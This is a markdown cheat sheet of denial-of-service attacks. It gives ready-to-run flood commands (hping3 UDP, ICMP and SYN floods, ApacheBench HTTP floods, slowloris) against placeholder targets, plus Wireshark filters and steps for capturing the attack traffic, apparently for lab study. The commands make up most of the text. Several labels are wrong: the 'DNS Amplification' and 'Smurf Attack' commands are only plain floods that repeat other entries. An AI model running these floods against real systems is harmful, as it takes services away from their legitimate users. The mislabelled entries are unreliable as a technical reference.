### 1. Volume-Based Attacks
**Aim:**
Volume-based attacks aim to overwhelm the target with a massive amount of traffic, consuming bandwidth and resources.

**Types:**
- **UDP Flood:**
  - **Command:**
    ```bash
    hping3 -2 -p 53 --flood -V <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    udp
    ```

- **ICMP Flood (Ping Flood):**
  - **Command:**
    ```bash
    hping3 -C 8 --flood -V <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    icmp
    ```

- **DNS Amplification:**
  - **Command:**
    ```bash
    hping3 -2 -p 53 --flood -V <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    dns
    ```

**Effect:**
These attacks can saturate the target's bandwidth, making it unavailable to legitimate users.

### 2. Protocol Attacks
**Aim:**
Protocol attacks exploit weaknesses in the network protocol stack, consuming server resources.

**Types:**
- **SYN Flood:**
  - **Command:**
    ```bash
    hping3 -S -p 80 --flood -V <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    tcp.flags.syn == 1
    ```

- **Ping of Death:**
  - **Command:**
    ```bash
    hping3 -C 8 --flood -V -d 65500 <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    icmp
    ```

- **Smurf Attack:**
  - **Command:**
    ```bash
    hping3 -C 8 --flood -V <target_ip>
    ```
  - **Wireshark Filter:**
    ```plaintext
    icmp
    ```

**Effect:**
These attacks can exhaust server resources, leading to denial of service.

### 3. Application Layer Attacks
**Aim:**
Application layer attacks target specific applications or services, overwhelming them with requests.

**Types:**
- **HTTP GET/POST Flood:**
  - **Command:**
    ```bash
    ab -n 10000 -c 100 <target_url>
    ```
  - **Wireshark Filter:**
    ```plaintext
    http
    ```

- **Slowloris:**
  - **Command:**
    ```bash
    slowloris <target_ip> -p 80 -s 500 -t 100
    ```
  - **Wireshark Filter:**
    ```plaintext
    http
    ```

- **XML/JSON API Flood:**
  - **Command:**
    ```bash
    ab -n 10000 -c 100 -p postdata.txt <target_url>
    ```
  - **Wireshark Filter:**
    ```plaintext
    http
    ```

**Effect:**
These attacks can exhaust application resources, making the service unavailable to legitimate users.

### Capturing Traffic with Wireshark
To capture the traffic for these attacks, follow these steps:

1. **Start Wireshark:**
   - Open Wireshark and select the network interface you want to capture traffic on.

2. **Apply Filters:**
   - Use the appropriate Wireshark filters mentioned above to capture the specific type of traffic.

3. **Start Capture:**
   - Begin the capture before initiating the attack.

4. **Analyze Traffic:**
   - After the attack, stop the capture and analyze the traffic to observe the effects of the attack.

